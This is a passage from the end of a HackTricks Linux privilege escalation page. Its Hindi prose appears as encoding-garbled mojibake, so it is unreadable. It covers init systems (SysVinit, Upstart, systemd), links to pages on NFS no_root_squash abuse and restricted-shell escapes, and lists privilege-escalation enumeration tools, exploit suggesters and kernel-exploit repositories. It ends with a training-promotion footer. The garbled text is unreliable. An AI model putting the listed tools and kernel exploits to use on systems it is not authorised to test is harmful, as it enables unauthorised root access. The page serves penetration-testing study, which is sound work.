рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА `/etc/init.d` **рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕** рдХрд╛ рдШрд░ рд╣реИ рдЬреЛ System V init (SysVinit) рдХреЗ рд▓рд┐рдП рд╣реИ, рдЬреЛ **рдХреНрд▓рд╛рд╕рд┐рдХ Linux рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рдкреНрд░рдгрд╛рд▓реА** рд╣реИред рдЗрд╕рдореЗрдВ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ `start`, `stop`, `restart`, рдФрд░ рдХрднреА-рдХрднреА `reload` рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рд╕реАрдзреЗ рдпрд╛ `/etc/rc?.d/` рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред Redhat рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рдкрде `/etc/rc.d/init.d` рд╣реИред

рджреВрд╕рд░реА рдУрд░, `/etc/init` **Upstart** рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ, рдЬреЛ Ubuntu рджреНрд╡рд╛рд░рд╛ рдкреЗрд╢ рдХреА рдЧрдИ рдПрдХ рдирдИ **рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди** рдкреНрд░рдгрд╛рд▓реА рд╣реИ, рдЬреЛ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрди рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред Upstart рдореЗрдВ рд╕рдВрдХреНрд░рдордг рдХреЗ рдмрд╛рд╡рдЬреВрдж, SysVinit рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдЕрднреА рднреА Upstart рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ Upstart рдореЗрдВ рдПрдХ рд╕рдВрдЧрддрддрд╛ рдкрд░рдд рд╣реИред

**systemd** рдПрдХ рдЖрдзреБрдирд┐рдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХрдХрд░рдг рдФрд░ рд╕реЗрд╡рд╛ рдкреНрд░рдмрдВрдзрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрднрд░рддрд╛ рд╣реИ, рдЬреЛ рдорд╛рдВрдЧ рдкрд░ рдбреЗрдорди рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ, рдСрдЯреЛрдорд╛рдЙрдВрдЯ рдкреНрд░рдмрдВрдзрди, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд┐рддрд┐ рд╕реНрдиреИрдкрд╢реЙрдЯ рдЬреИрд╕реА рдЙрдиреНрдирдд рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рддрд░рдг рдкреИрдХреЗрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ `/usr/lib/systemd/` рдореЗрдВ рдФрд░ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдВрд╢реЛрдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП `/etc/systemd/system/` рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рд░рд▓ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## рдЕрдиреНрдп рддрд░рдХреАрдмреЗрдВ

### NFS рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╢реЗрд▓ рд╕реЗ рднрд╛рдЧрдирд╛

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## рдХрд░реНрдиреЗрд▓ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд░рдХреНрд╖рд╛

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## рдЕрдзрд┐рдХ рдорджрдж

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux рд╕реНрдерд╛рдиреАрдп рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рд╡реЗрдХреНрдЯрд░ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдЙрдкрдХрд░рдг:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t рд╡рд┐рдХрд▓реНрдк)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux рдФрд░ MAC рдореЗрдВ рдХрд░реНрдиреЗрд▓ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (рднреМрддрд┐рдХ рдкрд╣реБрдВрдЪ):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**рдЕрдзрд┐рдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХрд╛ рд╕рдВрдХрд▓рди**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## рд╕рдВрджрд░реНрдн

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
